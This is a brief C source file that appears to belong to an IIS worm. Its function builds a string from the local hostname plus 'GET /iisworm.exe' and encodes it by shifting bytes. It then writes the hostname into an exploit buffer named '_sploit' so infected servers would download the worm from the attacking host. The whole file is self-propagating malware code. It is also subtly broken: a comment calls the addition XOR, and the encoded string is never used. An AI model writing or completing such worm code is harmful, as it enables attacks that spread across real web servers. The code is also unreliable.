#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

void setuphostname(void) {
    char hostname[1024];
    struct hostent *he;
    char tmp[1024];
    size_t len;
    int i;

    if (gethostname(hostname, sizeof(hostname)) != 0) return;
    he = gethostbyname(hostname);
    if (!he) return;

    strncpy(tmp, he->h_name, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    strncat(tmp, "!GET /iisworm.exe", sizeof(tmp) - strlen(tmp) - 1);

    for (i = 0; i < (int)strlen(tmp); i++)
        tmp[i] += 0x21;   // XOR with 0x21 (add 0x21)

    len = strlen(he->h_name);
    if (len > 100) len = 100;

    // Copy into the exploit buffer at the correct offset
    memcpy(_sploit + sizeof(_sploit) - 102, he->h_name, len);
}
